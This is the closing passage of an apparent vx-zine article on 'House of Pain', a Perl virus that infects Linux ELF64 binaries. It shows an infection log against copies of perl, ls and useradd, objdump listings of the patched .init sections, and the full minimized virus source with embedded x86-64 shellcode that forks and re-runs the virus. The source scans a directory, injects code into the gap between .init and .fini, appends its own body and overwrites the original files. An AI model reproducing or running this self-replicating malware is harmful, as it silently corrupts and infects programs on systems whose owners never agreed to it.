+ $ jump!  jump!  jump!  jump!
+ $ ./ls
+ hop.pl ls  perl
+ $ jump!  jump!  jump!  jump!
+
+ (third infection from infected binary)
+ $ cp /usr/sbin/useradd .
+ $ ./ls
+ hop.pl ls  perl  useradd
+ $ jump!  jump!  jump!  jump!
+ $ ./useradd -h
+ $ ./useradd -h
+ Modo de uso: useradd [opciones] USUARIO
+             useradd -D
+             useradd -D [opciones]
+ [...]
+ $ jump!  jump!  jump!  jump!
+
+In the output above local copies of the binaries perl, ls and useradd where
+infected successfully. A disassembly of sections .init and .fini of such files
+displays the following:
+
+$ objdump -d -j .init perl
+[...]
+0000000000047000 &lt;.init&gt;:
+   47000:       48 83 ec 08             sub    $0x8,%rsp
+   47004:       48 8b 05 d5 9f 33 00    mov    0x339fd5(%rip),%rax
+   4700b:       48 85 c0                test   %rax,%rax
+   4700e:       74 02                   je     47012 &lt;endgrent@plt-0x1e&gt;
+   47010:       ff d0                   callq  *%rax
+   47012:       48 83 c4 08             add    $0x8,%rsp
+   47016:       90                      nop
+
+$ objdump -d -j .fini perl
+[...]
+00000000001cb05c &lt;.fini&gt;:
+  1cb05c:       48 83 ec 08             sub    $0x8,%rsp
+  1cb060:       48 83 c4 08             add    $0x8,%rsp
+  1cb064:       c3                      retq
+
+$ objdump -d -j .init ls
+[...]
+0000000000004000 &lt;.init&gt;:
+    4000:       48 83 ec 08             sub    $0x8,%rsp
+    4004:       48 8b 05 d5 ff 01 00    mov    0x1ffd5(%rip),%rax
+    400b:       48 85 c0                test   %rax,%rax
+    400e:       74 02                   je     4012 &lt;__ctype@plt-0x1e&gt;
+    4010:       ff d0                   callq  *%rax
+    4012:       48 83 c4 08             add    $0x8,%rsp
+    4016:       90                      nop
+
+$ objdump -d -j .fini ls
+[...]
+00000000000181a0 &lt;.fini&gt;:
+   181a0:       48 83 ec 08             sub    $0x8,%rsp
+   181a4:       48 83 c4 08             add    $0x8,%rsp
+   181a8:       c3                      retq
+
+$ objdump -d -j .init useradd
+[...]
+0000000000005000 &lt;.init&gt;:
+    5000:       48 83 ec 08             sub    $0x8,%rsp
+    5004:       48 8b 05 c5 bf 01 00    mov    0x1bfc5(%rip),%rax
+    500b:       48 85 c0                test   %rax,%rax
+    500e:       74 02                   je     5012 &lt;endgrent@plt-0x1e&gt;
+    5010:       ff d0                   callq  *%rax
+    5012:       48 83 c4 08             add    $0x8,%rsp
+    5016:       90                      nop
+
+$ objdump -d -j .fini useradd
+[...]
+00000000000172f4 &lt;.fini&gt;:
+   172f4:       48 83 ec 08             sub    $0x8,%rsp
+   172f8:       48 83 c4 08             add    $0x8,%rsp
+   172fc:       c3                      retq
+
+
+As the reader may observe all three .init sections have its final byte patched
+with a NOP instruction. However, since the headers information is not modified,
+the parasite code injected in the .init and .fini sections is not displayed in
+any of the infected binaries.
+
+Thanks to C. and K. for all the support and always listening to my vx ideas.
+
+Greets to all the nice people from tmp0ut and vxug.
+
+
+--[ 8. The code
+
+The final minimized version of "House of Pain" is presented below. This code,
+the code discussed in Section 5 and a packed version can be found at [8][9][10].
+
+------------------------------ hop.pl ------------------------------------------
+#!/usr/bin/perl
+# House of Pain - by isra
+use File::Copy;
+sub r{read$_[0],$x,$_[1];return$x}
+sub k{seek$_[0],$_[1],0}
+sub w{syswrite$_[0],$_[1]}
+
+$p1="\xe8\x44\x00\x00\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c"
+."\x00\x2d\x78\x00";
+$p2="\x00\x5e\x48\x31\xc0\xb8\x39\x00\x00\x00\x0f\x05\x85\xc0\x75\x2e\x48\x8d"
+."\x3e\x48\x31\xd2\x52\x48\x8d\x5e\x11\x53\x48\x8d\x5e\x0e\x53\x57\x48\x89"
+."\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\x48\x21"
+."\xd2\xb8\x3c\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x31\xd2";
+$s=length($p1)+length($p2)+50;
+
+print "jump!  "x4;
+
+foreach $f(glob qq{"./*"}){
+    next if(!-f$f);next if($f eq$0);
+
+    $fs=(stat$f)[7];
+    $vx="\n";$r="__"."END__";$fn=0;
+    open my$vh,'&lt;',$0; while(&lt;$vh&gt;){
+        $fn++ if($_=~"#!/usr/bin/perl");$vx.=$_ if($fn);last if($_=~/$r/);
+    } $vxs=length($vx);
+
+    open$h,'&lt;:raw',$f; my@e=unpack("C a a a C12 S2 I q3 I S6",r($h,64));
+    next if($e[0]!=127&&$e[1]!~'E'&&$e[2]!~"L"&&$e[3]!~"F");
+
+    $q=0;open$qh,'&lt;:raw',$f;
+    while(&lt;$qh&gt;){if($_=~"#!/usr/bin/perl"){$q++;last}}next if($q);
+
+    k($h,$e[21]);for($i=0;$i&lt;18;$i++){
+        @u=unpack("I2 q4 I2 q2",r($h,$e[26]));
+        if($u[2]==6){
+            ($y1,$z1)=($u[4],$u[5]) if(!$y1);
+            ($y2,$z2)=($u[4],$u[5]) if(!$y2 && $i&gt;12 && $u[8]==4);
+        } last if($y2);
+    } next if(!$y1 or !$y2);
+
+    @u=unpack("I2 q4 I2 q2",r($h,$e[26]));next if($u[4]-($y2+$z2)&lt;$s+$vxs);
+    open$t,'&gt;:raw',"$f.t";k($h,0);w($t,r($h,$y1+$z1-1));
+
+    $d=$y2+$z2-$y1-$z1-7;$j1="\x90\xe9".pack("V",$d)."\xc3";r($h,7);w($t,$j1);
+    w($t,r($h,$d+1));r($h,$s);w($t,$p1);@c=split//,$f;
+    for($i=2;$i&lt;length($f);$i++){ w($t,pack("C",(hex unpack("H2",$c[$i]))))}
+    for($i=length($f)-2;$i&lt;50;$i++){ w($t,pack("C",0x0))}
+
+    w($t,$p2);$j2="\xe9".pack("V",-$d-$s-7);w($t,$j2);r($h,5);
+    w($t,$vx);r($h,$vxs);w($t,r($h,$fs-($y2+$z2+$s+$vxs+5)));
+    unlink$f;copy("$f.t",$f);unlink"$f.t";chmod 0755,$f;
+}
+__END__
+------------------------------ hop.pl ------------------------------------------
+
+
+--[ 9. References
+
+[1] http://ouah.org/elf-pv.txt
+[2] https://www.win.tue.nl/~aeb/linux/hh/virus/unix-viruses.txt
+[3] https://bitlackeys.org/papers/pocorgtfo20.pdf
+[4] https://tmpout.sh/3/12.html
+[5] https://github.com/ilv/vx/blob/main/hop/padding-bytes.pl
+[6] https://tmpout.sh/3/30.html
+[7] https://hckng.org/articles/perljam-elf64-virus.html
+[8] https://github.com/ilv/vx/blob/main/hop/Linux.HouseOfPain.pl
+[9] https://github.com/ilv/vx/blob/main/hop/Linux.HouseOfPain-pretty.pl
+[10] https://github.com/ilv/vx/blob/main/hop/Linux.HouseOfPain-packed.pl
+
+--[ <a href="14.html">PREV</a> | <a href="index.html">HOME</a> | <a href="16.html">NEXT</a> ]--
+
+</pre></div></body>
